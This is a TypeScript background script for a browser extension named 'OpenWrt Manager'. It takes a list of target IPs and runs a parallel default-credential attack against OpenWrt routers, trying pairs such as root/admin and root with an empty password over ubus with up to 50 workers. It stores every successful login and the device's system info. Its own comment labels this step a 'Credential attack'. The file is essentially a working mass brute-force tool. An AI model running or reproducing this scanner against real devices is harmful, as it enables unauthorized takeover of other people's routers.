
import { UBusClient } from '@/utils/ubus';

// Storage keys
const STORAGE_KEY_RESULTS = 'local:scan_results';
const STORAGE_KEY_STATE = 'local:scan_state';

interface ScanResult {
    id: number;
    address: string;
    status: "success" | "failed" | "pending";
    username: string;
    password: string;
    details: string;
}

interface ScanState {
    isScanning: boolean;
    progress: {
        total: number;
        processed: number;
        success: number;
        failed: number;
    };
    targets: string;
}

export default defineBackground(() => {
    console.log('OpenWrt Manager: Background Service Worker Started');

    let isScanning = false;
    let shouldStop = false;

    // Listen for messages from Popup
    chrome.runtime.onMessage.addListener((message, _sender, sendResponse) => {
        if (message.type === 'START_SCAN') {
            startScan(message.targets, message.threads || 50);
        } else if (message.type === 'STOP_SCAN') {
            shouldStop = true;
            isScanning = false;
            updateState({ isScanning: false });
        } else if (message.type === 'GET_STATE') {
            // Optional: Popup might ask for instant state, though we sync to storage
            chrome.storage.local.get([STORAGE_KEY_STATE, STORAGE_KEY_RESULTS], (data) => {
                sendResponse(data);
            });
            return true; // async response
        }
    });

    async function updateState(updates: Partial<ScanState>) {
        const current = await chrome.storage.local.get(STORAGE_KEY_STATE);
        const newState = { ...(current[STORAGE_KEY_STATE] || {}), ...updates };
        await chrome.storage.local.set({ [STORAGE_KEY_STATE]: newState });
    }

    async function saveResults(results: ScanResult[]) {
        await chrome.storage.local.set({ [STORAGE_KEY_RESULTS]: results });
    }

    async function startScan(targetStr: string, threads: number) {
        if (isScanning) return;
        isScanning = true;
        shouldStop = false;

        const ipList = targetStr.split('\n').map(t => t.trim()).filter(t => t);
        if (ipList.length === 0) {
            isScanning = false;
            return;
        }

        // Initialize Results
        let results: ScanResult[] = ipList.map((ip, idx) => ({
            id: idx,
            address: ip,
            status: "pending",
            username: "-",
            password: "-",
            details: "等待队列..."
        }));

        await saveResults(results);
        await updateState({
            isScanning: true,
            targets: targetStr,
            progress: { total: ipList.length, processed: 0, success: 0, failed: 0 }
        });

        let currentIndex = 0;
        let processedCount = 0;
        let successCount = 0;
        let failedCount = 0;

        const scanItem = async (index: number) => {
            if (shouldStop) return;

            const updateResult = (updates: Partial<ScanResult>) => {
                results[index] = { ...results[index], ...updates };
                // throttle saves in real app, but for now direct save is okay for small batch
                // To optimize: save every X items or debounce
            };

            updateResult({ status: "pending", details: "连接中..." });
            // Save initial status
            await saveResults([...results]);

            const ip = ipList[index];
            const client = new UBusClient(ip);
            const isOnline = await client.checkOnline();

            if (!isOnline) {
                updateResult({ status: "failed", details: "无法连接" });
                failedCount++;
            } else {
                // Credential attack
                const creds = [
                    { u: 'root', p: 'admin' },
                    { u: 'root', p: 'password' },
                    { u: 'admin', p: 'password' },
                    { u: 'admin', p: 'admin' },
                    { u: 'root', p: 'root' },
                    { u: 'root', p: '' },
                ];

                updateResult({ details: "尝试认证..." });
                await saveResults([...results]);

                let authenticated = false;
                for (const c of creds) {
                    if (shouldStop) return;
                    try {
                        await client.login(c.u, c.p);
                        let sysInfoStr = "OpenWrt";
                        try {
                            const info = await client.getSystemInfo();
                            if (info?.release?.description) sysInfoStr = info.release.description;
                            else if (info?.board_name) sysInfoStr = info.board_name;
                        } catch (e) { }

                        updateResult({
                            status: "success",
                            username: c.u,
                            password: c.p || "<空>",
                            details: sysInfoStr
                        });
                        successCount++;
                        authenticated = true;
                        break;
                    } catch (e) { }
                }

                if (!authenticated) {
                    updateResult({ status: "failed", details: "认证失败" });
                    failedCount++;
                }
            }

            processedCount++;
            await saveResults([...results]);
            await updateState({
                progress: { total: ipList.length, processed: processedCount, success: successCount, failed: failedCount }
            });
        };

        // Worker Pool
        const maxWorkers = Math.min(threads, 50);
        const workers = [];
        const workerRoutine = async () => {
            while (currentIndex < ipList.length && !shouldStop) {
                const jobIndex = currentIndex++;
                await scanItem(jobIndex);
            }
        };

        for (let i = 0; i < maxWorkers; i++) {
            workers.push(workerRoutine());
        }

        await Promise.all(workers);

        isScanning = false;
        await updateState({ isScanning: false });
    }
});
